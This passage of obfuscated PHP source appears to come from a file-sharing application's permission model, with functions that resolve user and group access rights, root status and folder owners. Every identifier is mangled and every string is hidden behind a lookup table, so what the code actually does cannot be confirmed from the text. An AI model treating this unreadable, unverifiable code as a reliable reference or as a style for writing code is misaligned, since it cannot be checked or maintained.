ºÇç™ê[$Éåîç ×[$ÎÈùıé«[194]]]; if (!$ãæÆú˜™) { continue; } $Éåîç ×[$ÎÈùıé«[2192]] = $this->authTargetInfo($ãæÆú˜™); $Éåîç ×[$ÎÈùıé«[586]] = rtrim($Éåîç ×[$ÎÈùıé«[592]], $ÎÈùıé«[8]) . $ÎÈùıé«[8] . ltrim($Éåîç ×[$ÎÈùıé«[586]], $ÎÈùıé«[8]); $ÓáÓôöá[] = $Éåîç ×; $“Ü ¥û = count(explode($ÎÈùıé«[8], trim($Éåîç ×[$ÎÈùıé«[586]], $ÎÈùıé«[8]))); $©İ¿µ¸¡[] = $“Ü ¥û + ($Éåîç ×[$ÎÈùıé«[33]] == $ÎÈùıé«[78] ? 0 : 1000); } array_multisort($©İ¿µ¸¡, SORT_ASC, $ÓáÓôöá); return $ÓáÓôöá; } private function groupChidldAllRootSource($›™ÆÀ) { $’æ¸Ø¢ =& $_SERVER[ùèÅ´Ãš]; $Õó¹ûÍ— = Model($’æ¸Ø¢[1402])->groupChildrenAll($›™ÆÀ); $úÒ¾ƒ‚Ñ = array($’æ¸Ø¢[193] => 0, $’æ¸Ø¢[573] => array($’æ¸Ø¢[7], $Õó¹ûÍ—), $’æ¸Ø¢[191] => SourceModel::TYPE_GROUP); $ñ«ÄÔÒÛ = Model($’æ¸Ø¢[908])->field($’æ¸Ø¢[194])->where($úÒ¾ƒ‚Ñ)->select(); $ñ«ÄÔÒÛ = array_to_keyvalue($ñ«ÄÔÒÛ, $’æ¸Ø¢[12], $’æ¸Ø¢[194]); return $ñ«ÄÔÒÛ; } private function authTargetInfo($¼ã“Œ¬) { $¸û¥‹Ò =& $_SERVER[ùèÅ´Ãš]; $ìıŒ¼á° = array(); $ÎÕÅ°— = array(); $Â–İÚ¬° = 2 << 25; foreach ($¼ã“Œ¬ as $˜ä¨÷Œù) { $¶¦‡üÍÄ = Model($¸û¥‹Ò[575])->listData($˜ä¨÷Œù[$¸û¥‹Ò[2106]]); if (!$¶¦‡üÍÄ) { continue; } if ($˜ä¨÷Œù[$¸û¥‹Ò[191]] == SourceModel::TYPE_USER) { $ÃşÃõì™ = Model($¸û¥‹Ò[581])->getInfoSimpleOuter($˜ä¨÷Œù[$¸û¥‹Ò[573]]); if ($ÃşÃõì™[$¸û¥‹Ò[1797]] == $¸û¥‹Ò[1287]) { continue; } if ($ÃşÃõì™[$¸û¥‹Ò[1797]] == $¸û¥‹Ò[231]) { $ÃşÃõì™[$¸û¥‹Ò[32]] = LNG($¸û¥‹Ò[2193]); } } else { $ÃşÃõì™ = Model($¸û¥‹Ò[589])->getInfoSimple($˜ä¨÷Œù[$¸û¥‹Ò[573]]); } if (!$ÃşÃõì™) { continue; } $ÃşÃõì™[$¸û¥‹Ò[544]] = $¶¦‡üÍÄ; $ìıŒ¼á°[] = $ÃşÃõì™; $ŠÆÆôÙ = 0; if ($˜ä¨÷Œù[$¸û¥‹Ò[191]] == SourceModel::TYPE_GROUP) { $ŠÆÆôÙ = $Â–İÚ¬° * 2; } if ($˜ä¨÷Œù[$¸û¥‹Ò[191]] == SourceModel::TYPE_USER) { $ŠÆÆôÙ = $Â–İÚ¬°; } if ($˜ä¨÷Œù[$¸û¥‹Ò[191]] == SourceModel::TYPE_USER && $˜ä¨÷Œù[$¸û¥‹Ò[573]] == $¸û¥‹Ò[231]) { $ŠÆÆôÙ = 0; } $ÎÕÅ°—[] = $¶¦‡üÍÄ[$¸û¥‹Ò[489]] + $ŠÆÆôÙ; } array_multisort($ÎÕÅ°—, SORT_DESC, $ìıŒ¼á°); return $ìıŒ¼á°; } public function getAllChildrenByUser($éÎğç¸, $Äöª—³ú) { $ëŠ„š„ =& $_SERVER[ùèÅ´Ãš]; $Í‚½­›• = Model($ëŠ„š„[601])->getInfo($Äöª—³ú); if (!$Äöª—³ú || !$éÎğç¸ || !$Í‚½­›•) { return array(); } $ìßÇ‹ô = Model($ëŠ„š„[1442])->sourceInfo($éÎğç¸); $­ÄÉ©¢„ = array(); $€Ü—Øò¤ = 1; if ($ìßÇ‹ô[$ëŠ„š„[193]] == $ëŠ„š„[231] && $ìßÇ‹ô[$ëŠ„š„[573]] != $€Ü—Øò¤ && $this->groupContainUser($ìßÇ‹ô[$ëŠ„š„[573]], $Äöª—³ú)) { foreach ($Í‚½­›•[$ëŠ„š„[1403]] as $û¸è€ôÊ) { $ƒ”²ô‰ö = Model($ëŠ„š„[589])->getInfo($û¸è€ôÊ[$ëŠ„š„[1404]]); $Òøƒ±š¶ = Model($ëŠ„š„[601])->getInfoSimpleOuter($Äöª—³ú); $Òøƒ±š¶[$ëŠ„š„[544]] = $û¸è€ôÊ[$ëŠ„š„[489]]; if (Model($ëŠ„š„[575])->authCheckAction($û¸è€ôÊ[$ëŠ„š„[489]][$ëŠ„š„[489]], $ëŠ„š„[2018])) { continue; } $ë±º” = array($ëŠ„š„[32] => $ëŠ„š„[1307] . $ƒ”²ô‰ö[$ëŠ„š„[32]], $ëŠ„š„[194] => $ƒ”²ô‰ö[$ëŠ„š„[90]][$ëŠ„š„[194]], $ëŠ„š„[87] => KodIO::make($ƒ”²ô‰ö[$ëŠ„š„[90]][$ëŠ„š„[194]]), $ëŠ„š„[193] => $ëŠ„š„[231], $ëŠ„š„[191] => $ëŠ„š„[582], $ëŠ„š„[33] => $ëŠ„š„[623], $ëŠ„š„[586] => $ƒ”²ô‰ö[$ëŠ„š„[593]], $ëŠ„š„[1404] => $ƒ”²ô‰ö[$ëŠ„š„[1404]], $ëŠ„š„[590] => $ƒ”²ô‰ö[$ëŠ„š„[193]], $ëŠ„š„[2192] => array($Òøƒ±š¶)); $­ÄÉ©¢„[$ë±º”[$ëŠ„š„[194]]] = $ë±º”; } } $ö²£Ö¿é = array(); $¿…Ò‚§Ÿ = $this->getAllChildren($éÎğç¸); foreach ($¿…Ò‚§Ÿ as $‡çµ«êç) { $†”ºÇ® = !1; foreach ($‡çµ«êç[$ëŠ„š„[2192]] as $îÈÕÁ›˜) { if ($îÈÕÁ›˜[$ëŠ„š„[1797]]) { if ($îÈÕÁ›˜[$ëŠ„š„[1797]] == $Äöª—³ú) { $†”ºÇ® = !0; break; } } if ($îÈÕÁ›˜[$ëŠ„š„[1404]]) { if ($this->groupContainUser($îÈÕÁ›˜[$ëŠ„š„[1404]], $Äöª—³ú)) { $†”ºÇ® = !0; break; } } } if ($†”ºÇ®) { $ö²£Ö¿é[] = $‡çµ«êç; } $‹¸ØÁØê = $‡çµ«êç[$ëŠ„š„[194]]; if (isset($­ÄÉ©¢„[$‹¸ØÁØê])) { $‡çµ«êç[$ëŠ„š„[2192]][] = $­ÄÉ©¢„[$‹¸ØÁØê][0]; $­ÄÉ©¢„[$‹¸ØÁØê] = !1; } } $­ÄÉ©¢„ = array_filter(array_values($­ÄÉ©¢„)); $ö²£Ö¿é = array_merge($­ÄÉ©¢„, $ö²£Ö¿é); return $ö²£Ö¿é; } public function setAllChildrenByUser($ºÈ¯º§Ş, $™»ãƒœ, $½ğã¯ø) { $«Èî£ÁÈ =& $_SERVER[ùèÅ´Ãš]; $”îÊ¡¢ = $this->getAllChildrenByUser($ºÈ¯º§Ş, $™»ãƒœ); if (!$½ğã¯ø || !$”îÊ¡¢) { return !1; } foreach ($”îÊ¡¢ as $Ä ÙË¤â) { $Ò­··æ© = array(); foreach ($Ä ÙË¤â[$«Èî£ÁÈ[2192]] as $¸ÇÒÎˆ) { $©üµ‘ÔÖ = $¸ÇÒÎˆ[$«Èî£ÁÈ[544]]; $”È“Ä“ = $¸ÇÒÎˆ[$«Èî£ÁÈ[1797]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $ÅÆá‘Î = $¸ÇÒÎˆ[$«Èî£ÁÈ[1797]] ? $¸ÇÒÎˆ[$«Èî£ÁÈ[1797]] : $¸ÇÒÎˆ[$«Èî£ÁÈ[1404]]; if ($¸ÇÒÎˆ[$«Èî£ÁÈ[1797]] && $¸ÇÒÎˆ[$«Èî£ÁÈ[1797]] == $™»ãƒœ) { continue; } $Ò­··æ©[] = array($«Èî£ÁÈ[194] => $Ä ÙË¤â[$«Èî£ÁÈ[194]], $«Èî£ÁÈ[191] => $”È“Ä“, $«Èî£ÁÈ[573] => intval($ÅÆá‘Î), $«Èî£ÁÈ[2106] => isset($©üµ‘ÔÖ[$«Èî£ÁÈ[477]]) ? intval($©üµ‘ÔÖ[$«Èî£ÁÈ[477]]) : 0, $«Èî£ÁÈ[2169] => isset($©üµ‘ÔÖ[$«Èî£ÁÈ[2169]]) ? intval($©üµ‘ÔÖ[$«Èî£ÁÈ[2169]]) : -1); } $Ò­··æ©[] = array($«Èî£ÁÈ[194] => $Ä ÙË¤â[$«Èî£ÁÈ[194]], $«Èî£ÁÈ[191] => SourceModel::TYPE_USER, $«Èî£ÁÈ[573] => intval($™»ãƒœ), $«Èî£ÁÈ[2106] => intval($½ğã¯ø), $«Èî£ÁÈ[2169] => -1); $this->where(array($«Èî£ÁÈ[493] => $Ä ÙË¤â[$«Èî£ÁÈ[194]]))->delete(); $this->addAll($Ò­··æ©); } return !0; } public function get($˜ş€Ãİ‰) { $‘µ¯ìâÊ = $this->getSourceList(array($˜ş€Ãİ‰), !0); return $‘µ¯ìâÊ[0]; } public function getSourceList($…İÌãäô, $±‡ş˜û = false, $‚Ô“‰²„ = false) { $ç•ñƒ =& $_SERVER[ùèÅ´Ãš]; if (!$…İÌãäô) { return array(); } $˜àĞçÖê = Model($ç•ñƒ[1442]); if (!$±‡ş˜û && count($…İÌãäô) == 1) { $±‡ş˜û = array(); $±‡ş˜û[$…İÌãäô[0]] = $˜àĞçÖê->sourceInfo($…İÌãäô[0]); } if (!$±‡ş˜û) { $£ü‘÷· = array($ç•ñƒ[493] => array($ç•ñƒ[494], $…İÌãäô)); $±‡ş˜û = $˜àĞçÖê->field($ç•ñƒ[2194])->where($£ü‘÷·)->select(); $±‡ş˜û = array_to_keyvalue($±‡ş˜û, $ç•ñƒ[194]); } $øÆŞÈéµ = $…İÌãäô; foreach ($±‡ş˜û as $Şı ÖØÕ => $ÂÃàÄ‰¡) { $…İ·Ñ‹ = $˜àĞçÖê->parentLevelArray($ÂÃàÄ‰¡[$ç•ñƒ[588]]); $øÆŞÈéµ = array_merge($øÆŞÈéµ, array($Şı ÖØÕ), array_reverse($…İ·Ñ‹)); } $øÆŞÈéµ = array_values(array_unique($øÆŞÈéµ)); if (!$øÆŞÈéµ) { return array(); } $äŸÏİÌ = $this->sourceAuthSelect($øÆŞÈéµ); $–Ô–ÒĞ¸ = array(); foreach ($øÆŞÈéµ as $ïü‚ô€) { if (isset($äŸÏİÌ[$ïü‚ô€])) { $–Ô–ÒĞ¸[$ïü‚ô€] = $äŸÏİÌ[$ïü‚ô€]; } } $ß”Ü„òú = $this->userIsRoot($‚Ô“‰²„); $Õ£ñÅÛ = AuthModel::authAll(); $†ğ†¶ôä = array($ç•ñƒ[490] => $Õ£ñÅÛ, $ç•ñƒ[2195] => array($ç•ñƒ[495] => 0, $ç•ñƒ[2003] => $Õ£ñÅÛ, $ç•ñƒ[496] => LNG($ç•ñƒ[2196]), $ç•ñƒ[2020] => $ç•ñƒ[2197])); $ô‚ôÅã¯ = array(); foreach ($±‡ş˜û as $ïü‚ô€ => $‰“Í”¾) { if ($ß”Ü„òú && $GLOBALS[$ç•ñƒ[6]][$ç•ñƒ[2016]]) { $ô‚ôÅã¯[$ïü‚ô€] = $†ğ†¶ôä; continue; } $ô‚ôÅã¯[$ïü‚ô€] = $this->makeSourceAuth($‰“Í”¾, $–Ô–ÒĞ¸, $‚Ô“‰²„); } return $ô‚ôÅã¯; } public function authDeepCheck($á¶úœ¢Ï, $š®â½ñí = false) { $Şù÷Ôå =& $_SERVER[ùèÅ´Ãš]; $š®â½ñí = $š®â½ñí ? $š®â½ñí : USER_ID; $ şŞòÕ¶ = $this->makeAuthDeep($š®â½ñí); if (!in_array($á¶úœ¢Ï, $ şŞòÕ¶[$Şù÷Ôå[2198]])) { return !1; } $Şœ§êø = array(); foreach ($ şŞòÕ¶[$Şù÷Ôå[2199]] as $İ„•É•“ => $Ú™Ú·Êã) { if (!in_array($á¶úœ¢Ï, $Ú™Ú·Êã)) { continue; } $Şœ§êø[] = $İ„•É•“; } if (!$Şœ§êø) { return !1; } $âî¹ÌÏ¨ = $Şœ§êø ? $Şœ§êø[0] : $á¶úœ¢Ï; return array($Şù÷Ôå[490] => -1, $Şù÷Ôå[544] => array($Şù÷Ôå[495] => $Şù÷Ôå[1287], $Şù÷Ôå[2003] => $Şù÷Ôå[231], $Şù÷Ôå[496] => LNG($Şù÷Ôå[2200]), $Şù÷Ôå[2020] => $Şù÷Ôå[2201]), $Şù÷Ôå[2202] => LNG($Şù÷Ôå[2203]), $Şù÷Ôå[2204] => $this->sourceAuthInfo($âî¹ÌÏ¨)); } protected function makeAuthDeep($¯—¿‡ìø = false) { $ËÂ¾Ü§ =& $_SERVER[ùèÅ´Ãš]; static $¨×Öœ¥ = array(); $¯—¿‡ìø = $¯—¿‡ìø ? $¯—¿‡ìø : USER_ID; if (isset($¨×Öœ¥[$¯—¿‡ìø])) { return $¨×Öœ¥[$¯—¿‡ìø]; } $Õª¾²Çú = Model($ËÂ¾Ü§[2205])->listData(); $àÄÃÄ˜ = array(); foreach ($Õª¾²Çú as $˜î¬å„Õ) { if ($˜î¬å„Õ[$ËÂ¾Ü§[489]] == 0 && $˜î¬å„Õ[$ËÂ¾Ü§[2019]] == $ËÂ¾Ü§[91]) { $àÄÃÄ˜[] = $˜î¬å„Õ[$ËÂ¾Ü§[477]]; } } $ï«„¹ÁÌ = $this->userGroupParents($¯—¿‡ìø); $°Î™Äˆ = array($ËÂ¾Ü§[191] => SourceModel::TYPE_USER, $ËÂ¾Ü§[573] => $¯—¿‡ìø); if ($ï«„¹ÁÌ) { $°Î™Äˆ = array(array($ËÂ¾Ü§[191] => SourceModel::TYPE_USER, $ËÂ¾Ü§[573] => $¯—¿‡ìø), array($ËÂ¾Ü§[191] => SourceModel::TYPE_GROUP, $ËÂ¾Ü§[573] => array($ËÂ¾Ü§[494], $ï«„¹ÁÌ)), $ËÂ¾Ü§[1088] => $ËÂ¾Ü§[2100]); } $°È­ûÜê = $this->field($ËÂ¾Ü§[2206])->where($°Î™Äˆ)->select(); $ÈÊÆÔø = array(); $ ¼ÖµÃ = array_to_keyvalue_group($°È­ûÜê, $ËÂ¾Ü§[194]); foreach ($ ¼ÖµÃ as $‚ñ¸Õ¶÷ => $”°°í…) { $×°ş®´ = $this->authArrayCheck($”°°í…, $¯—¿‡ìø); if ($×°ş®´[$ËÂ¾Ü§[490]] > 0) { $ÈÊÆÔø[] = $‚ñ¸Õ¶÷ . $ËÂ¾Ü§[12]; } } if ($ï«„¹ÁÌ) { $Ì·›¤– = Model($ËÂ¾Ü§[589]); foreach ($ï«„¹ÁÌ as $ùŠù†®) { $½ÃÇüÃ = $Ì·›¤–->getInfo($ùŠù†®); if (!$½ÃÇüÃ || !is_array($½ÃÇüÃ[$ËÂ¾Ü§[90]])) { continue; } $ÈÊÆÔø[] = $½ÃÇüÃ[$ËÂ¾Ü§[90]][$ËÂ¾Ü§[194]]; } } $¶ô€ÇÂ‚ = array(); $ˆÏæ¸Õ = $ï«„¹ÁÌ; $Ë†ñ”âÌ = Model($ËÂ¾Ü§[1442]); $Ì·›¤– = Model($ËÂ¾Ü§[589]); $äÛŒãâ = array(); $²¤ü¢Í = array(); $¤çµ–Ï = array(); $Î¢Šæ×Ô = array(); if ($ÈÊÆÔø) { $éŞ¥ç® = $Ë†ñ”âÌ->where(array($ËÂ¾Ü§[194] => array($ËÂ¾Ü§[494], $ÈÊÆÔø)))->select(); foreach ($éŞ¥ç® as $Èù¯ æö) { if ($Èù¯ æö[$ËÂ¾Ü§[507]] == $ËÂ¾Ü§[91]) { continue; } $œ±äÖµê = $Ë†ñ”âÌ->parentLevelArray($Èù¯ æö[$ËÂ¾Ü§[588]]); $¶ô€ÇÂ‚ = array_merge($¶ô€ÇÂ‚, $œ±äÖµê); $ˆÏæ¸Õ[] = $Èù¯ æö[$ËÂ¾Ü§[573]]; $äÛŒãâ[$Èù¯ æö[$ËÂ¾Ü§[194]]] = $œ±äÖµê; $²¤ü¢Í[$Èù¯ æö[$ËÂ¾Ü§[194]]] = $Èù¯ æö[$ËÂ¾Ü§[573]]; } } $ˆÏæ¸Õ = array_values(array_unique($ˆÏæ¸Õ)); $é•¯Ó¹¡ = $ˆÏæ¸Õ; foreach ($é•¯Ó¹¡ as $ùŠù†®) { $½ÃÇüÃ = $Ì·›¤–->getInfo($ùŠù†®); $œ±äÖµê = $Ë†ñ”âÌ->parentLevelArray($½ÃÇüÃ[$ËÂ¾Ü§[588]]); $ˆÏæ¸Õ = array_merge($ˆÏæ¸Õ, $œ±äÖµê); } $ˆÏæ¸Õ = array_values(array_unique($ˆÏæ¸Õ)); foreach ($ˆÏæ¸Õ as $ùŠù†®) { $½ÃÇüÃ = $Ì·›¤–->getInfo($ùŠù†®); $¶ô€ÇÂ‚[] = $½ÃÇüÃ[$ËÂ¾Ü§[90]][$ËÂ¾Ü§[194]]; $¤çµ–Ï[$ùŠù†®] = $½ÃÇüÃ[$ËÂ¾Ü§[90]][$ËÂ¾Ü§[194]]; $Î¢Šæ×Ô[$ùŠù†®] = $Ë†ñ”âÌ->parentLevelArray($½ÃÇüÃ[$ËÂ¾Ü§[588]]); } foreach ($äÛŒãâ as $¾‹ûÃ¹„ => $¯¡ğ™ ¯) { $é¥ÇÅ = $²¤ü¢Í[$¾‹ûÃ¹„]; if (!$é¥ÇÅ || !$¤çµ–Ï[$é¥ÇÅ]) { continue; } $˜ˆ’ˆƒ¡ = array(); foreach ($Î¢Šæ×Ô[$é¥ÇÅ] as $ùŠù†®) { $˜ˆ’ˆƒ¡[] = $¤çµ–Ï[$ùŠù†®]; } $äÛŒãâ[$¾‹ûÃ¹„] = array_merge($˜ˆ’ˆƒ¡, $¯¡ğ™ ¯); } $¶ô€ÇÂ‚ = array_values(array_unique($¶ô€ÇÂ‚)); $ïêÖê = array($ËÂ¾Ü§[2198] => $¶ô€ÇÂ‚, $ËÂ¾Ü§[2199] => $äÛŒãâ); $¨×Öœ¥[$¯—¿‡ìø] = $ïêÖê; return $ïêÖê; } private function makeSourceAuth($Å°³½¡¿, $èü˜‰…, $ôÄ‚ØÉš = false) { $‹Øõ“· =& $_SERVER[ùèÅ´Ãš]; $…¢ÒË¾ = $‹Øõ“·[91]; $“Á‰Ü§˜ = $Å°³½¡¿[$‹Øõ“·[573]]; $êš‰Øä» = $Å°³½¡¿[$‹Øõ“·[191]] == SourceModel::TYPE_GROUP; $Æ¾½³¡µ = $êš‰Øä» ? $this->groupRootAuth($“Á‰Ü§˜, $ôÄ‚ØÉš) : !1; if ($Æ¾½³¡µ && Model($‹Øõ“·[575])->authCheckAction($Æ¾½³¡µ[$‹Øõ“·[489]], $‹Øõ“·[2018])) { return $this->groupAuthInfo($Æ¾½³¡µ, $“Á‰Ü§˜); } $Ğ“úËØ = Model($‹Øõ“·[1442])->parentLevelArray($Å°³½¡¿[$‹Øõ“·[588]]); $Ğ“úËØ = array_merge(array($Å°³½¡¿[$‹Øõ“·[194]]), array_reverse($Ğ“úËØ)); $ö×ªöÒ = !1; foreach ($Ğ“úËØ as $â˜ÈŞÂĞ) { if (!isset($èü˜‰…[$â˜ÈŞÂĞ])) { continue; } $ïÉŸÑ¦¸ = $this->authMake($èü˜‰…[$â˜ÈŞÂĞ], $ôÄ‚ØÉš); if ($ïÉŸÑ¦¸[$‹Øõ“·[544]]) { $ö×ªöÒ = $ïÉŸÑ¦¸; break; } } if (!$êš‰Øä») { return $ö×ªöÒ; } if (!$ö×ªöÒ && $Æ¾½³¡µ) { $ö×ªöÒ = $this->groupAuthInfo($Æ¾½³¡µ, $“Á‰Ü§˜); } if (!$ö×ªöÒ) { $ ¿×“†˜ = Model($‹Øõ“·[589])->getInfo($“Á‰Ü§˜); $…™«™‰ = explode($‹Øõ“·[50], trim($ ¿×“†˜[$‹Øõ“·[588]], $‹Øõ“·[50])); $…™«™‰ = array_reverse($…™«™‰); foreach ($…™«™‰ as $óàÔ¼¸Œ) { if ($óàÔ¼¸Œ == $‹Øõ“·[231] || $óàÔ¼¸Œ == $…¢ÒË¾) { continue; } $µ‡õ‘º = $this->groupRootAuth($óàÔ¼¸Œ, $ôÄ‚ØÉš); if (!$µ‡õ‘º) { continue; } $ö×ªöÒ = $this->groupAuthInfo($µ‡õ‘º, $óàÔ¼¸Œ); break; } } if (!$ö×ªöÒ || $ö×ªöÒ[$‹Øõ“·[490]] <= 0) { $Ş„äú‘Ö = $this->authDeepCheck($Å°³½¡¿[$‹Øõ“·[194]], $ôÄ‚ØÉš); if ($Ş„äú‘Ö) { $ö×ªöÒ = $Ş„äú‘Ö; } } return $ö×ªöÒ; } private function userIsRoot($ğÄÏŠŠÂ = false) { $¿ÆĞû¹ï =& $_SERVER[ùèÅ´Ãš]; if (!$ğÄÏŠŠÂ && KodUser::isRoot()) { return !0; } $¼®¬èš = Model($¿ÆĞû¹ï[601])->getInfo($ğÄÏŠŠÂ); $¢¿ì¿ÅÏ = Model($¿ÆĞû¹ï[2207])->listData($¼®¬èš[$¿ÆĞû¹ï[2208]]); if ($¢¿ì¿ÅÏ && $¢¿ì¿ÅÏ[$¿ÆĞû¹ï[579]][$¿ÆĞû¹ï[2209]] == 1) { return !0; } return !1; } private function sourceAuthInfo($ş¤…Ä­ù) { $¿óøú×¸ =& $_SERVER[ùèÅ´Ãš]; $öÅï£û¿ = Model($¿óøú×¸[1442]); $§Áê”ÙÓ = $öÅï£û¿->sourceInfo($ş¤…Ä­ù); if (!$§Áê”ÙÓ) { return !1; } $öÅï£û¿->groupPathDisplay($§Áê”ÙÓ); $“ë°è = array($§Áê”ÙÓ); $“ë°è = $öÅï£û¿->_listAppendPath($“ë°è); $§Áê”ÙÓ = $“ë°è[0]; $©½ñéš = $§Áê”ÙÓ[$¿óøú×¸[586]]; if (isset($§Áê”ÙÓ[$¿óøú×¸[594]])) { $®Š…áö = explode($¿óøú×¸[8], trim($§Áê”ÙÓ[$¿óøú×¸[586]], $¿óøú×¸[8])); array_shift($®Š…áö); $©½ñéš = $§Áê”ÙÓ[$¿óøú×¸[592]] . $¿óøú×¸[2210] . implode($¿óøú×¸[8], $®Š…áö); } return array($¿óøú×¸[496] => $§Áê”ÙÓ[$¿óøú×¸[32]], $¿óøú×¸[87] => KodIO::make($§Áê”ÙÓ[$¿óøú×¸[194]]), $¿óøú×¸[2211] => $©½ñéš); } private function groupAuthInfo($Ñ§Àï×ä, $¢ßâÉïÈ) { $Öµ³ú‰– =& $_SERVER[ùèÅ´Ãš]; $™™çÛÖ› = Model($Öµ³ú‰–[589])->getInfo($¢ßâÉïÈ); return array($Öµ³ú‰–[2212] => intval($Ñ§Àï×ä[$Öµ³ú‰–[489]]), $Öµ³ú‰–[2195] => $Ñ§Àï×ä, $Öµ³ú‰–[2213] => LNG($Öµ³ú‰–[2214]), $Öµ³ú‰–[2204] => array($Öµ³ú‰–[496] => $™™çÛÖ›[$Öµ³ú‰–[32]], $Öµ³ú‰–[87] => KodIO::make($™™çÛÖ›[$Öµ³ú‰–[90]][$Öµ³ú‰–[194]]), $Öµ³ú‰–[2211] => $™™çÛÖ›[$Öµ³ú‰–[593]])); } protected function groupRootAuth($ì·Ï©æÕ, $•éä­ˆÚ = false) { $æ°Ì™Ÿì =& $_SERVER[ùèÅ´Ãš]; $•éä­ˆÚ = $•éä­ˆÚ ? $•éä­ˆÚ : USER_ID; $œÜ—úˆõ = $•éä­ˆÚ . $æ°Ì™Ÿì[2215] . $ì·Ï©æÕ; static $À ­ÁÎÒ = array(); if (isset($À ­ÁÎÒ[$œÜ—úˆõ])) { return $À ­ÁÎÒ[$œÜ—úˆõ]; } $Á†×ãïÒ = Model($æ°Ì™Ÿì[589])->getInfo($ì·Ï©æÕ); $§‡Â­‘ö = $this->userGroupList($•éä­ˆÚ); $ü‘Â¡«â = isset($§‡Â­‘ö[$ì·Ï©æÕ]) ? $§‡Â­‘ö[$ì·Ï©æÕ][$æ°Ì™Ÿì[489]] : !1; if ($ü‘Â¡«â && Model($æ°Ì™Ÿì[575])->authCheckAction($ü‘Â¡«â[$æ°Ì™Ÿì[489]], $æ°Ì™Ÿì[2018])) { $À ­ÁÎÒ[$œÜ—úˆõ] = $ü‘Â¡«â; return $ü‘Â¡«â; } $»Ì‹­³£ = $this->sourceAuthSelect($Á†×ãïÒ[$æ°Ì™Ÿì[90]][$æ°Ì™Ÿì[194]]); $Ÿ¡‰›“£ = $»Ì‹­³£ ? $this->authMake($»Ì‹­³£, $•éä­ˆÚ) : !1; $ñ§Áñ£Á = $Ÿ¡‰›“£ ? $Ÿ¡‰›“£[$æ°Ì™Ÿì[544]] : !1; $À ­ÁÎÒ[$œÜ—úˆõ] = $ñ§Áñ£Á ? $ñ§Áñ£Á : $ü‘Â¡«â; return $À ­ÁÎÒ[$œÜ—úˆõ]; } public function authOwnerApply($å‰¢„ªÁ) { $ÒËËéöé =& $_SERVER[ùèÅ´Ãš]; if (empty($å‰¢„ªÁ[$ÒËËéöé[489]]) || isset($å‰¢„ªÁ[$ÒËËéöé[2216]]) && $å‰¢„ªÁ[$ÒËËéöé[2216]]) { return $å‰¢„ªÁ; } if (AuthModel::authCheckRoot($å‰¢„ªÁ[$ÒËËéöé[489]][$ÒËËéöé[490]])) { return $å‰¢„ªÁ; } $¯Äãöíğ = Model($ÒËËéöé[1442])->parentLevelArray($å‰¢„ªÁ[$ÒËËéöé[588]]); $¯Äãöíğ = array_merge(array($å‰¢„ªÁ[$ÒËËéöé[194]]), array_reverse($¯Äãöíğ)); $½ÜÚÀì½ = $this->sourceAuthSelect($¯Äãöíğ); $¡ŸıçÒ = array(); $‘ˆ˜ï = array(); foreach ($½ÜÚÀì½ as $„Í•ÀåÒ => $Ü¼°ß„) { $…¢¤Ì® = $this->authFolderOwnerUser($Ü¼°ß„); $¡ŸıçÒ[$„Í•ÀåÒ] = $…¢¤Ì®; $‘ˆ˜ï = array_merge($‘ˆ˜ï, $…¢¤Ì®[$ÒËËéöé[669]]); if ($…¢¤Ì®[$ÒËËéöé[2217]]) { break; } } if (count($‘ˆ˜ï) == 0) { $‘ˆ˜ï = $this->authFolderOwnerGroup($å‰¢„ªÁ[$ÒËËéöé[573]]); } $‘ˆ˜ï = array_unique($‘ˆ˜ï); if (AuthModel::authCheckRoot($å‰¢„ªÁ[$ÒËËéöé[489]][$ÒËËéöé[490]])) { $‘ˆ˜ï[] = USER_ID; } $å‰¢„ªÁ[$ÒËËéöé[489]][$ÒËËéöé[2218]] = Model($ÒËËéöé[581])->userListInfo($‘ˆ˜ï); return $å‰¢„ªÁ; } private function authFolderOwnerGroup($Â­àİÉ•) { $ŞŒÀœÁĞ =& $_SERVER[ùèÅ´Ãš]; $Ë•ÜÂÄÛ = Model($ŞŒÀœÁĞ[2092])->where(array($ŞŒÀœÁĞ[1404] => $Â­àİÉ•))->select(); $‹¹¶˜Ìğ = array(); if (!$Ë•ÜÂÄÛ) { return $‹¹¶˜Ìğ; } foreach ($Ë•ÜÂÄÛ as $›‰“Ê¥) { $ÙÀ©Æ© = $this->authInfo($›‰“Ê¥); if (AuthModel::authCheckRoot($ÙÀ©Æ©[$ŞŒÀœÁĞ[489]])) { $‹¹¶˜Ìğ[] = $›‰“Ê¥[$ŞŒÀœÁĞ[1797]]; } } return $‹¹¶˜Ìğ; } private function authFolderOwnerUser($¬­²¼Ş‘) { $ªÜÂ¥éó =& $_SERVER[ùèÅ´Ãš]; $ßı¥‡· = array(); $§¸°¬’á = !1; foreach ($¬­²¼Ş‘ as $À›øŞ) { $ˆ¼Èµß = $this->authInfo($À›øŞ); if ($À›øŞ[$ªÜÂ¥éó[573]] == $ªÜÂ¥éó[231]) { $§¸°¬’á = !0; } if ($À›øŞ[$ªÜÂ¥éó[191]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($ˆ¼Èµß[$ªÜÂ¥éó[489]])) { $ßı¥‡·[] = $À›øŞ[$ªÜÂ¥éó[573]]; } } } return array($ªÜÂ¥éó[669] => $ßı¥‡·, $ªÜÂ¥éó[2217] => $§¸°¬’á); } public function authMake($í³‚†ÆÃ, $¢ˆóƒô = false) { $Ò—º•Ê¿ =& $_SERVER[ùèÅ´Ãš]; $š“îºÖŞ = $this->authArrayCheck($í³‚†ÆÃ, $¢ˆóƒô); if ($š“îºÖŞ[$Ò—º•Ê¿[2219]]) { $š“îºÖŞ[$Ò—º•Ê¿[2219]] = $this->sourceAuthInfo($š“îºÖŞ[$Ò—º•Ê¿[2219]]); } return $š“îºÖŞ; } public function authArrayCheck($î¦àœñ¡, $éÜƒÛø‰ = false) { $«‡¡¿” =& $_SERVER[ùèÅ´Ãš]; if (!$î¦àœñ¡) { return array($«‡¡¿”[490] => 0, $«‡¡¿”[544] => !1); } $éÜƒÛø‰ = $éÜƒÛø‰ ? $éÜƒÛø‰ : USER_ID; $’ı¦ğ–Ó = 0; $èÕæĞô = 0; $–ÂèÈå = 0; $²Œ‚ü¯ô = 0; $©ö“æ§· = 0; $êÁæ§· = 0; $÷ÑÙÌÃ = 1000; $ôÛÕÚÛ = 0; $Î…‘™û¦ = 0; $ˆûìÇä = 0; $Ì²üû›¾ = 0; $­´úœ·Ş = array($«‡¡¿”[194] => 0); foreach ($î¦àœñ¡ as $­´úœ·Ş) { $Ÿ²„”óà = $this->authInfo($­´úœ·Ş); if (!$Ÿ²„”óà) { continue; } $Á½à›œî = $­´úœ·Ş[$«‡¡¿”[573]]; $ºÄşø„Ó = 